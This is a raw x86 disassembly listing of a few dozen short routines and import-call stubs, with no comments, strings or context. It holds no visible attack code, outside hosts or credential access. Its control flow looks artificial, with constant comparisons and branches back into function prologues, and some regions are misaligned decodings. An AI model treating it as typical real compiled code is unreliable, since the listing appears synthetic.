  4d108c:	jbe    0x4d107b
  4d108e:	push   ebx
  4d108f:	push   DWORD PTR [ebx+0xc8]
  4d1095:	push   DWORD PTR [ebx+0x60]
  4d1098:	push   DWORD PTR [ebx+0x44]
  4d109b:	push   edi
  4d109c:	call   0x4d0ce4
  4d10a1:	add    esp,0x10
  4d10a4:	pop    ebx
  4d10a5:	push   0xfffffff4
  4d10a7:	call   0x4d1550
  4d10ac:	add    esp,0x4
  4d10af:	call   0x4d13cc
  4d10b4:	add    esp,0x4
  4d10b7:	add    esp,0x34
  4d10ba:	pop    ebp
  4d10bb:	ret    
  4d10bc:	mov    edi,edi
  4d10be:	push   ebp
  4d10bf:	mov    ebp,esp
  4d10c1:	sub    esp,0x30
  4d10c4:	lea    edx,[edi-0xec]
  4d10ca:	sub    DWORD PTR [edx+0xd0],edi
  4d10d0:	push   edx
  4d10d1:	push   0x0
  4d10d3:	call   0x4d0904
  4d10d8:	add    esp,0x4
  4d10db:	pop    edx
  4d10dc:	push   edx
  4d10dd:	push   esi
  4d10de:	push   ecx
  4d10df:	push   DWORD PTR [edx+0x1c8]
  4d10e5:	call   0x4d11c8
  4d10ea:	add    esp,0xc
  4d10ed:	pop    edx
  4d10ee:	push   edx
  4d10ef:	push   0x0
  4d10f1:	call   0x4d13c0
  4d10f6:	add    esp,0x4
  4d10f9:	pop    edx
  4d10fa:	add    esp,0x30
  4d10fd:	pop    ebp
  4d10fe:	ret    
  4d10ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1105:	sub    esp,0x58
  4d1108:	lea    edx,ds:0x4d30f4
  4d110e:	add    DWORD PTR [edx+0x14],ebx
  4d1111:	push   edx
  4d1112:	push   eax
  4d1113:	push   esi
  4d1114:	push   esi
  4d1115:	call   0x4d0acc
  4d111a:	add    esp,0xc
  4d111d:	pop    edx
  4d111e:	push   edx
  4d111f:	mov    edi,0x0
  4d1124:	push   edi
  4d1125:	call   0x4d0a74
  4d112a:	add    esp,0x4
  4d112d:	pop    edx
  4d112e:	push   edx
  4d112f:	push   0x0
  4d1131:	call   0x4d0854
  4d1136:	add    esp,0x4
  4d1139:	pop    edx
  4d113a:	add    esp,0x58
  4d113d:	pop    ebp
  4d113e:	ret    
  4d113f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1145:	sub    esp,0x38
  4d1148:	lea    eax,[esi-0xd0]
  4d114e:	and    esi,0x1b
  4d1151:	push   eax
  4d1152:	push   ebx
  4d1153:	push   ecx
  4d1154:	call   0x4d1100
  4d1159:	add    esp,0x8
  4d115c:	pop    eax
  4d115d:	push   eax
  4d115e:	mov    ebx,0x0
  4d1163:	push   ebx
  4d1164:	call   0x4d13c0
  4d1169:	add    esp,0x4
  4d116c:	pop    eax
  4d116d:	push   eax
  4d116e:	push   0x0
  4d1170:	call   0x4d074c
  4d1175:	add    esp,0x4
  4d1178:	pop    eax
  4d1179:	add    esp,0x38
  4d117c:	pop    ebp
  4d117d:	ret    
  4d117e:	add    BYTE PTR [eax],al
  4d1180:	pop    edi
  4d1181:	call   DWORD PTR ds:0x4d2078
  4d1187:	call   edi
  4d1189:	add    BYTE PTR [eax],al
  4d118b:	add    BYTE PTR [edi-0x1],bl
  4d118e:	adc    eax,0x4d207c
  4d1193:	call   edi
  4d1195:	add    BYTE PTR [eax],al
  4d1197:	add    BYTE PTR [edi-0x1],bl
  4d119a:	adc    eax,0x4d2028
  4d119f:	call   edi
  4d11a1:	add    BYTE PTR [eax],al
  4d11a3:	add    BYTE PTR [edi-0x1],bl
  4d11a6:	adc    eax,0x4d206c
  4d11ab:	call   edi
  4d11ad:	add    BYTE PTR [eax],al
  4d11af:	add    BYTE PTR [edi-0x1],bl
  4d11b2:	adc    eax,0x4d201c
  4d11b7:	call   edi
  4d11b9:	add    BYTE PTR [eax],al
  4d11bb:	add    BYTE PTR [edi-0x1],bl
  4d11be:	adc    eax,0x4d2070
  4d11c3:	call   edi
  4d11c5:	add    BYTE PTR [eax],al
  4d11c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11cd:	sub    esp,0x30
  4d11d0:	lea    esi,[edx+0x18c]
  4d11d6:	sub    DWORD PTR [ebp-0x18],0x3738
  4d11dd:	push   0x0
  4d11df:	call   0x4d0b58
  4d11e4:	add    esp,0x4
  4d11e7:	push   esi
  4d11e8:	push   edx
  4d11e9:	push   eax
  4d11ea:	push   ebx
  4d11eb:	call   0x4d0e60
  4d11f0:	add    esp,0xc
  4d11f3:	pop    esi
  4d11f4:	mov    ecx,0x0
  4d11f9:	push   ecx
  4d11fa:	call   0x4d0854
  4d11ff:	add    esp,0x4
  4d1202:	add    esp,0x30
  4d1205:	pop    ebp
  4d1206:	ret    
  4d1207:	add    BYTE PTR [edi-0x1],bl
  4d120a:	adc    eax,0x4d2098
  4d120f:	call   edi
  4d1211:	add    BYTE PTR [eax],al
  4d1213:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1219:	sub    esp,0x44
  4d121c:	lea    edi,ds:0x4d30d4
  4d1222:	mov    DWORD PTR [ebp-0xc],esi
  4d1225:	push   edi
  4d1226:	call   0x4d13cc
  4d122b:	add    esp,0x4
  4d122e:	pop    edi
  4d122f:	push   edi
  4d1230:	push   ecx
  4d1231:	push   edx
  4d1232:	push   DWORD PTR [edi+0x100]
  4d1238:	call   0x4d0dd4
  4d123d:	add    esp,0xc
  4d1240:	pop    edi
  4d1241:	push   edi
  4d1242:	push   0x0
  4d1244:	call   0x4d13c0
  4d1249:	add    esp,0x4
  4d124c:	pop    edi
  4d124d:	add    esp,0x44
  4d1250:	pop    ebp
  4d1251:	ret    
  4d1252:	add    BYTE PTR [eax],al
  4d1254:	mov    edi,edi
  4d1256:	push   ebp
  4d1257:	mov    ebp,esp
  4d1259:	sub    esp,0x2c
  4d125c:	lea    ebx,[ecx-0x18c]
  4d1262:	cmp    ebx,0x4ba9
  4d1268:	je     0x4d1257
  4d126a:	push   ebx
  4d126b:	push   DWORD PTR [ebx+0x130]
  4d1271:	push   DWORD PTR [ebx+0xcc]
  4d1277:	push   esi
  4d1278:	push   DWORD PTR [ebx+0x15c]
  4d127e:	call   0x4d13e4
  4d1283:	add    esp,0x10
  4d1286:	pop    ebx
  4d1287:	mov    edi,0x0
  4d128c:	push   edi
  4d128d:	call   0x4d13c0
  4d1292:	add    esp,0x4
  4d1295:	push   0x0
  4d1297:	call   0x4d13c0
  4d129c:	add    esp,0x4
  4d129f:	add    esp,0x2c
  4d12a2:	pop    ebp
  4d12a3:	ret    
  4d12a4:	mov    edi,edi
  4d12a6:	push   ebp
  4d12a7:	mov    ebp,esp
  4d12a9:	sub    esp,0x40
  4d12ac:	mov    edx,0x4d3150
  4d12b1:	sbb    eax,0xffffc8dd
  4d12b6:	push   edx
  4d12b7:	push   esi
  4d12b8:	push   DWORD PTR [edx+0xc0]
  4d12be:	push   DWORD PTR [edx+0xf4]
  4d12c4:	push   DWORD PTR [edx+0x1c4]
  4d12ca:	call   0x4d0fcc
  4d12cf:	add    esp,0x10
  4d12d2:	pop    edx
  4d12d3:	push   edx
  4d12d4:	push   0x0
  4d12d6:	call   0x4d0904
  4d12db:	add    esp,0x4
  4d12de:	pop    edx
  4d12df:	push   edx
  4d12e0:	push   0x0
  4d12e2:	call   0x4d0a74
  4d12e7:	add    esp,0x4
  4d12ea:	pop    edx
  4d12eb:	add    esp,0x40
  4d12ee:	pop    ebp
  4d12ef:	ret    
  4d12f0:	mov    edi,edi
  4d12f2:	push   ebp
  4d12f3:	mov    ebp,esp
  4d12f5:	sub    esp,0x1c
  4d12f8:	mov    eax,0x4d301c
  4d12fd:	cmp    eax,0x5963
  4d1302:	jbe    0x4d12f3
  4d1304:	push   eax
  4d1305:	push   ecx
  4d1306:	push   ecx
  4d1307:	call   0x4d0770
  4d130c:	add    esp,0x8
  4d130f:	pop    eax
  4d1310:	push   eax
  4d1311:	call   0x4d1474
  4d1316:	add    esp,0x4
  4d1319:	pop    eax
  4d131a:	push   eax
  4d131b:	mov    edx,0xfffffff4
  4d1320:	push   edx
  4d1321:	call   0x4d1550
  4d1326:	add    esp,0x4
  4d1329:	pop    eax
  4d132a:	add    esp,0x1c
  4d132d:	pop    ebp
  4d132e:	ret    
  4d132f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1335:	sub    esp,0x3c
  4d1338:	lea    ebx,[eax+0x150]
  4d133e:	add    edi,DWORD PTR [ebp-0x2c]
  4d1341:	push   ebx
  4d1342:	push   DWORD PTR [ebx+0x12c]
  4d1348:	push   DWORD PTR [ebx+0x1e0]
  4d134e:	call   0x4d0bac
  4d1353:	add    esp,0x8
  4d1356:	pop    ebx
  4d1357:	mov    edi,0x0
  4d135c:	push   edi
  4d135d:	call   0x4d0a74
  4d1362:	add    esp,0x4
  4d1365:	mov    edx,0x0
  4d136a:	push   edx
  4d136b:	call   0x4d0a80
  4d1370:	add    esp,0x4
  4d1373:	add    esp,0x3c
  4d1376:	pop    ebp
  4d1377:	ret    
  4d1378:	mov    edi,edi
  4d137a:	push   ebp
  4d137b:	mov    ebp,esp
  4d137d:	sub    esp,0x5c
  4d1380:	lea    ecx,ds:0x4d316c
  4d1386:	add    DWORD PTR [ebp-0x58],0x6464
  4d138d:	push   ecx
  4d138e:	push   DWORD PTR [ecx+0x1f4]
  4d1394:	push   ebx
  4d1395:	push   DWORD PTR [ecx+0x68]
  4d1398:	call   0x4d0a18
  4d139d:	add    esp,0xc
  4d13a0:	pop    ecx
  4d13a1:	push   ecx
  4d13a2:	push   0xfffffff4
  4d13a4:	call   0x4d1550
  4d13a9:	add    esp,0x4
  4d13ac:	pop    ecx
  4d13ad:	push   ecx
  4d13ae:	push   0x0
  4d13b0:	call   0x4d0740
  4d13b5:	add    esp,0x4
  4d13b8:	pop    ecx
  4d13b9:	add    esp,0x5c
  4d13bc:	pop    ebp
  4d13bd:	ret    
  4d13be:	add    BYTE PTR [eax],al
  4d13c0:	pop    edi
  4d13c1:	call   DWORD PTR ds:0x4d2010
  4d13c7:	call   edi
  4d13c9:	add    BYTE PTR [eax],al
  4d13cb:	add    BYTE PTR [edi-0x1],bl
  4d13ce:	adc    eax,0x4d2024
  4d13d3:	call   edi
  4d13d5:	add    BYTE PTR [eax],al
  4d13d7:	add    BYTE PTR [edi-0x1],bl
  4d13da:	adc    eax,0x4d2018
  4d13df:	call   edi
  4d13e1:	add    BYTE PTR [eax],al
  4d13e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13e9:	sub    esp,0x40
  4d13ec:	lea    esi,ds:0x4d3148
  4d13f2:	sub    ebx,DWORD PTR [ebp-0x40]
  4d13f5:	push   esi
  4d13f6:	push   DWORD PTR [esi+0xcc]
  4d13fc:	push   edx
  4d13fd:	push   edx
  4d13fe:	push   ebx
  4d13ff:	call   0x4d0f84
  4d1404:	add    esp,0x10
  4d1407:	pop    esi
  4d1408:	push   0x0
  4d140a:	call   0x4d0904
  4d140f:	add    esp,0x4
  4d1412:	mov    edx,0x0
  4d1417:	push   edx
  4d1418:	call   0x4d15c0
  4d141d:	add    esp,0x4
  4d1420:	add    esp,0x40
  4d1423:	pop    ebp
  4d1424:	ret    
  4d1425:	add    BYTE PTR [eax],al
  4d1427:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d142d:	sub    esp,0x28
  4d1430:	lea    edx,[ecx+0x90]
  4d1436:	mov    DWORD PTR [edx-0x5c],0xffffe2c4
  4d143d:	push   edx
  4d143e:	push   eax
  4d143f:	push   DWORD PTR [edx+0x58]
  4d1442:	push   edi
  4d1443:	push   DWORD PTR [edx+0x188]
  4d1449:	call   0x4d0818
  4d144e:	add    esp,0x10
  4d1451:	pop    edx
  4d1452:	push   edx
  4d1453:	mov    ecx,0x0
  4d1458:	push   ecx
  4d1459:	call   0x4d0904
  4d145e:	add    esp,0x4
  4d1461:	pop    edx
  4d1462:	push   edx
  4d1463:	push   0x0
  4d1465:	call   0x4d0740
  4d146a:	add    esp,0x4
  4d146d:	pop    edx
  4d146e:	add    esp,0x28
  4d1471:	pop    ebp
  4d1472:	ret    
  4d1473:	add    BYTE PTR [edi-0x1],bl
  4d1476:	adc    eax,0x4d2034
  4d147b:	call   edi
  4d147d:	add    BYTE PTR [eax],al
  4d147f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1485:	sub    esp,0x20
  4d1488:	lea    ecx,ds:0x4d3168
  4d148e:	mov    ebx,edx
  4d1490:	push   ecx
  4d1491:	mov    ecx,0x0
  4d1496:	push   ecx
  4d1497:	call   0x4d0904
  4d149c:	add    esp,0x4
  4d149f:	pop    ecx
  4d14a0:	push   ecx
  4d14a1:	push   DWORD PTR [ecx+0x1cc]
  4d14a7:	push   DWORD PTR [ecx+0x30]
  4d14aa:	push   eax
  4d14ab:	push   DWORD PTR [ecx]
  4d14ad:	call   0x4d1428
  4d14b2:	add    esp,0x10
  4d14b5:	pop    ecx
  4d14b6:	push   ecx
  4d14b7:	call   0x4d13cc
  4d14bc:	add    esp,0x4
  4d14bf:	pop    ecx
  4d14c0:	add    esp,0x20
  4d14c3:	pop    ebp
  4d14c4:	ret    
  4d14c5:	add    BYTE PTR [eax],al
  4d14c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14cd:	sub    esp,0x3c
  4d14d0:	mov    ebx,0x4d30e0
  4d14d5:	add    eax,DWORD PTR [ebx-0x84]
  4d14db:	push   ebx
  4d14dc:	push   DWORD PTR [ebx+0x180]
  4d14e2:	push   edx
  4d14e3:	push   eax
  4d14e4:	call   0x4d1480
  4d14e9:	add    esp,0xc
  4d14ec:	pop    ebx
  4d14ed:	mov    edx,0x0
  4d14f2:	push   edx
  4d14f3:	call   0x4d074c
  4d14f8:	add    esp,0x4
  4d14fb:	call   0x4d1474
  4d1500:	add    esp,0x4
  4d1503:	add    esp,0x3c
  4d1506:	pop    ebp
  4d1507:	ret    
  4d1508:	mov    edi,edi
  4d150a:	push   ebp
  4d150b:	mov    ebp,esp
  4d150d:	sub    esp,0x5c
  4d1510:	lea    eax,ds:0x4d3030
  4d1516:	sbb    edx,DWORD PTR [eax+0x38]
  4d1519:	push   eax
  4d151a:	mov    edi,0x0
  4d151f:	push   edi
  4d1520:	call   0x4d0904
  4d1525:	add    esp,0x4
  4d1528:	pop    eax
  4d1529:	push   eax
  4d152a:	push   DWORD PTR [eax+0x11c]
  4d1530:	push   edi
  4d1531:	push   edx
  4d1532:	push   esi
  4d1533:	call   0x4d12a4
  4d1538:	add    esp,0x10
  4d153b:	pop    eax
  4d153c:	push   eax
  4d153d:	push   0x0
  4d153f:	call   0x4d0740
  4d1544:	add    esp,0x4
  4d1547:	pop    eax
  4d1548:	add    esp,0x5c
  4d154b:	pop    ebp
  4d154c:	ret    
  4d154d:	add    BYTE PTR [eax],al
  4d154f:	add    BYTE PTR [edi-0x1],bl
  4d1552:	adc    eax,0x4d2014
  4d1557:	call   edi
  4d1559:	add    BYTE PTR [eax],al
  4d155b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1561:	sub    esp,0x38
  4d1564:	lea    ecx,ds:0x4d30ac
  4d156a:	xor    edi,DWORD PTR [ebp-0x30]
  4d156d:	push   ecx
  4d156e:	push   ebx
  4d156f:	push   DWORD PTR [ecx+0x158]
  4d1575:	call   0x4d0eb4
  4d157a:	add    esp,0x8
  4d157d:	pop    ecx
  4d157e:	push   ecx
  4d157f:	mov    edi,0x0
  4d1584:	push   edi
  4d1585:	call   0x4d13c0
  4d158a:	add    esp,0x4
  4d158d:	pop    ecx
  4d158e:	push   ecx
  4d158f:	lea    esi,[ecx-0xac]
  4d1595:	push   esi
  4d1596:	call   0x4d0c44
  4d159b:	add    esp,0x4
  4d159e:	test   eax,eax
  4d15a0:	jne    0x4d158f
  4d15a2:	pop    ecx
  4d15a3:	add    esp,0x38
  4d15a6:	pop    ebp
  4d15a7:	ret    
  4d15a8:	pop    edi
  4d15a9:	call   DWORD PTR ds:0x4d2080
  4d15af:	call   edi
  4d15b1:	add    BYTE PTR [eax],al
  4d15b3:	add    BYTE PTR [edi-0x1],bl
  4d15b6:	adc    eax,0x4d200c
  4d15bb:	call   edi
  4d15bd:	add    BYTE PTR [eax],al
  4d15bf:	add    BYTE PTR [edi-0x1],bl
  4d15c2:	adc    eax,0x4d2060
  4d15c7:	call   edi
  4d15c9:	add    BYTE PTR [eax],al
  4d15cb:	add    BYTE PTR [edi-0x1],bl
  4d15ce:	adc    eax,0x4d208c
  4d15d3:	call   edi
  4d15d5:	add    BYTE PTR [eax],al
	...
